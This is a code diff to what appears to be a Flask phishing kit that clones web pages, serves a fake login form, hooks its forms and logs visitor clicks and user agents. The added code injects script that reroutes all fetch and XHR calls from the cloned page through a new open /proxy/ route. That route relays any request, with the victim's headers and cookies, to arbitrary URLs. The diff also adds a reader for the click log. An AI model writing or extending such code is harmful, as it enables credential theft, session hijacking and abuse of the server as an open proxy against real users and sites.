@@ -1,5 +1,5 @@
 import uuid
-from flask import Blueprint, request, redirect, render_template, Response, send_from_directory
+from flask import Blueprint, request, redirect, render_template, Response, send_from_directory, stream_with_context
 from models import save_link, get_link, save_click
 from user_agents import parse
 import requests
@@ -127,6 +127,23 @@ def clone_page(encoded_url):
         <button type="submit">Login</button>
     </form>
     <script>
+    // Proxy all fetch and XHR requests
+    (function() {
+        const origFetch = window.fetch;
+        window.fetch = function(input, init) {
+            if (typeof input === 'string' && input.startsWith('http')) {
+                input = '/proxy/' + input.replace(/^https?:\\/\\//, '');
+            }
+            return origFetch(input, init);
+        };
+        const origOpen = XMLHttpRequest.prototype.open;
+        XMLHttpRequest.prototype.open = function(method, url, ...args) {
+            if (url.startsWith('http')) {
+                url = '/proxy/' + url.replace(/^https?:\\/\\//, '');
+            }
+            return origOpen.call(this, method, url, ...args);
+        };
+    })();
     window.addEventListener('DOMContentLoaded', function() {
         var forms = document.querySelectorAll('form');
         forms.forEach(function(f) {
@@ -286,3 +303,39 @@ def api_render_website():
 @main.route('/api/health', methods=['GET'])
 def api_health_check():
     return {'status': 'ok'}, 200
+
+@main.route('/proxy/<path:url>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
+def proxy(url):
+    import requests
+    from flask import make_response
+    method = request.method
+    headers = dict(request.headers)
+    headers.pop('Host', None)
+    # Support both http and https
+    if url.startswith('http:/') or url.startswith('https:/'):
+        target_url = url.replace(':/', '://', 1)
+    else:
+        target_url = 'https://' + url  # Default to https
+    params = request.args.to_dict()
+    data = request.get_data() if method in ['POST', 'PUT', 'PATCH'] else None
+    try:
+        resp = requests.request(method, target_url, headers=headers, params=params, data=data, cookies=request.cookies, allow_redirects=False, stream=True)
+        excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
+        response_headers = [(name, value) for (name, value) in resp.raw.headers.items() if name.lower() not in excluded_headers]
+        response = Response(stream_with_context(resp.iter_content(chunk_size=8192)), status=resp.status_code, headers=response_headers)
+        return response
+    except Exception as e:
+        return f'Proxy error: {e}', 502
+
+def get_all_clicks():
+    import os, json
+    CLICKS_FILE = os.path.join(os.path.dirname(__file__), 'clicks.txt')
+    clicks = []
+    if os.path.exists(CLICKS_FILE):
+        with open(CLICKS_FILE, 'r', encoding='utf-8') as f:
+            for line in f:
+                try:
+                    clicks.append(json.loads(line))
+                except Exception:
+                    continue
+    return clicks
